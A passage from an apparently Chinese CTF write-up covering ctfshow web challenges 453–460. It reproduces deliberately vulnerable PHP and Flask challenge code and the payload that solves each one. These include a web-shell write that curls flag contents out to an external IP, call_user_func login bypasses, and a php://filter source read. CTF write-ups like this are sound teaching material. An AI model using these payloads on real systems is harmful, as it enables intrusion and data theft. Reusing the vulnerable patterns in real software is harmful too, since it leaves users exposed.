class="keyword">else</span>&#123;</span><br><span class="line">		 	<span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line">		 &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line"> 		 <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line">		 <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line">		 <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">		 	<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;shell.php&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">		 	<span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;file write done in /var/www/shell.php&#x27;</span>);</span><br><span class="line">		 &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		 	<span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line">		 &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">system</span>(<span class="string">&#x27;php shell.php&#x27;</span>);</span><br><span class="line">		<span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;command exec done&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先看到这个ctf类是可以利用的，而http Server根据路由来执行对应的函数.路由是怎么产生的呢？通过对url按照斜线分隔开</p>
<p>那就好说了，先写恶意代码。由于没有回显，所以我们得外带</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#x27;curl http://43.140.198.45:5000/?flag=`cat fl*`&#x27;); ?&gt;</span><br><span class="line"># 路由</span><br><span class="line">/ctf/file</span><br></pre></td></tr></table></figure>

<p>然后执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ctf/exec</span><br></pre></td></tr></table></figure></li>
<li><p>web454 另类rce,额，还可以这样子</p>
<p>还是先读一下源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$http</span> = <span class="keyword">new</span> <span class="title class_">Swoole\Http\Server</span>(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">on</span>(<span class="string">&#x27;start&#x27;</span>, function (<span class="variable">$server</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Swoole http server is started at http://0.0.0.0:80\n&quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">on</span>(<span class="string">&#x27;request&#x27;</span>, function (<span class="variable">$request</span>, <span class="variable">$response</span>) &#123;</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$controller</span>, <span class="variable">$action</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>, <span class="title function_ invoke__">trim</span>(<span class="variable">$request</span>-&gt;server[<span class="string">&#x27;request_uri&#x27;</span>], <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">    <span class="variable">$route</span> = <span class="keyword">array</span>(<span class="string">&#x27;ctf&#x27;</span>);</span><br><span class="line">    <span class="variable">$method</span> = <span class="keyword">array</span>(<span class="string">&#x27;show&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;include&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$controller</span>, <span class="variable">$route</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$action</span>, <span class="variable">$method</span>))&#123;</span><br><span class="line">    	(<span class="keyword">new</span> <span class="variable">$controller</span>)-&gt;<span class="variable">$action</span>(<span class="variable">$request</span>, <span class="variable">$response</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    	 <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;&lt;h3&gt;where is flag?&lt;/h3&gt;&lt;!--/ctf/show?s=XXX  file_get_contents($_POST[\&#x27;s\&#x27;])--&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line">		 <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line">		 <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line">		 <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">		 	<span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$s</span>));</span><br><span class="line">		 &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		 	<span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line">		 &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line"> 		 <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line">		 <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line">		 <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">		 	<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;shell.php&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">		 	<span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;file write done in /var/www/shell.php&#x27;</span>);</span><br><span class="line">		 &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		 	<span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line">		 &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">include</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">include</span>(<span class="string">&#x27;shell.php&#x27;</span>);</span><br><span class="line">		<span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;include done&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到最后执行的方法名换成了include，其他没变化</p>
</li>
<li><p>web457 逻辑好乱鸭</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-02-06 01:58:32</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-02-06 12:19:36</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">abstract</span>  <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">visitor</span> <span class="keyword">extends</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;username!==<span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;password!==<span class="string">&#x27;admin888&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span> <span class="keyword">extends</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$u</span>= <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;password);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$u</span>==<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$u</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>];</span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$u</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$p</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>((<span class="keyword">new</span> <span class="title function_ invoke__">visitor</span>(<span class="variable">$u</span>,<span class="variable">$p</span>))-&gt;<span class="title function_ invoke__">check</span>())&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;welcome visitor :&#x27;</span>.<span class="variable">$u</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>((<span class="keyword">new</span> <span class="title function_ invoke__">admin</span>(<span class="variable">$u</span>,<span class="variable">$p</span>))-&gt;<span class="title function_ invoke__">check</span>())&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;welcome admin :&#x27;</span>.<span class="variable">$u</span>.<span class="string">&#x27; flag is :&#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先判断了visitor的check，也就是username必须得是admin或password必须是admin888我们才能绕过。</p>
<p>admin的check中call_user_func会调用参数password对应的值作为匿名函数，并且返回值存在弱类型比较，因此利用call_user_func调用返回true之类的函数即可即可</p>
<p><img src="/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221124234714731.png" alt="image-20221124234714731"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u=admin&amp;p=phpinfo</span><br></pre></td></tr></table></figure></li>
<li><p>web458 逻辑好乱呀</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-02-06 01:58:32</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-02-06 12:19:36</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">abstract</span>  <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">visitor</span> <span class="keyword">extends</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;username!==<span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;password!==<span class="string">&#x27;admin888&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span> <span class="keyword">extends</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$u</span>= <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;password);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$u</span>===<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$u</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>];</span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$u</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$p</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>((<span class="keyword">new</span> <span class="title function_ invoke__">visitor</span>(<span class="variable">$u</span>,<span class="variable">$p</span>))-&gt;<span class="title function_ invoke__">check</span>())&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;welcome visitor :&#x27;</span>.<span class="variable">$u</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>((<span class="keyword">new</span> <span class="title function_ invoke__">admin</span>(<span class="variable">$u</span>,<span class="variable">$p</span>))-&gt;<span class="title function_ invoke__">check</span>())&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;welcome admin :&#x27;</span>.<span class="variable">$u</span>.<span class="string">&#x27; flag is :&#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里admin的check函数存在一个强类型比较了，因此这里应该调用一个void类型的匿名函数。y4给的思路是利用php的反射函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">get_class(): 获取当前调用方法的类名； </span><br><span class="line">- 如果在类中省略 object， 则返回当前所在类的名称</span><br><span class="line">get_called_class():获取静态绑定后的类名；</span><br><span class="line">返回类的名称，如果不是在类中调用则返回 false</span><br></pre></td></tr></table></figure>

<p>那么也就是说我们在admin类实例对象的check方法中调用<code>get_class</code>的话即可返回对应的类名admin，满足了比较条件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u=admin&amp;p=get_class</span><br></pre></td></tr></table></figure></li>
<li><p>web459 小清新</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-02-06 01:58:32</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-02-06 13:25:16</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$u</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>];</span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$u</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$p</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">copy</span>(<span class="variable">$u</span>, <span class="variable">$p</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>我们直接copy会存在因为后缀是php可解析文件导致一些注释内容不可见的影响，注意<strong>copy文件是支持伪协议的</strong>，因此即可直接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u=php://filter/read=convert.base64-encode/resource=flag.php&amp;p=1</span><br></pre></td></tr></table></figure></li>
<li><p>web460 小清新</p>
<p>题目给了源码，啊这又来了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"><span class="keyword">from</span> func_timeout <span class="keyword">import</span> func_set_timeout</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> func_timeout</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">sys.modules[<span class="string">&#x27;os&#x27;</span>]=<span class="literal">None</span></span><br><span class="line">sys.modules[<span class="string">&#x27;imp&#x27;</span>]=<span class="literal">None</span></span><br><span class="line">sys.modules[<span class="string">&#x27;subprocess&#x27;</span>]=<span class="literal">None</span></span><br><span class="line">sys.modules[<span class="string">&#x27;socket&#x27;</span>]=<span class="literal">None</span></span><br><span class="line">sys.modules[<span class="string">&#x27;timeit&#x27;</span>]=<span class="literal">None</span></span><br><span class="line">sys.modules[<span class="string">&#x27;platform&#x27;</span>]=<span class="literal">None</span></span><br><span class="line">sys.modules[<span class="string">&#x27;sys&#x27;</span>]=<span class="literal">None</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">sys.modules[<span class="string">&#x27;importlib&#x27;</span>]=<span class="literal">None</span></span><br><span class="line"><span class="keyword">del</span> sys</span><br><span class="line"></span><br><span class="line"><span class="meta">@func_set_timeout(<span class="params"><span class="number">0.7</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">s</span>):</span><br><span class="line">    time.sleep(randmon.random())</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Q2B</span>(<span class="params">uchar</span>):</span><br><span class="line">    inside_code = <span class="built_in">ord</span>(uchar)</span><br><span class="line">    <span class="keyword">if</span> inside_code == <span class="number">0x3000</span>:</span><br><span class="line">        inside_code = <span class="number">0x0020</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        inside_code -= <span class="number">0xfee0</span></span><br><span class="line">    <span class="keyword">if</span> inside_code &lt; <span class="number">0x0020</span> <span class="keyword">or</span> inside_code &gt; <span class="number">0x7e</span>: </span><br><span class="line">        <span class="keyword">return</span> uchar</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(inside_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stringQ2B</span>(<span class="params">ustring</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([Q2B(uchar) <span class="keyword">for</span> uchar <span class="keyword">in</span> ustring])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        code = request.form[<span class="string">&#x27;code&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> code:</span><br><span class="line">            code = stringQ2B(code)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;\\u&#x27;</span> <span class="keyword">in</span> code:</span><br><span class="line">                <span class="keyword">return</span> <span 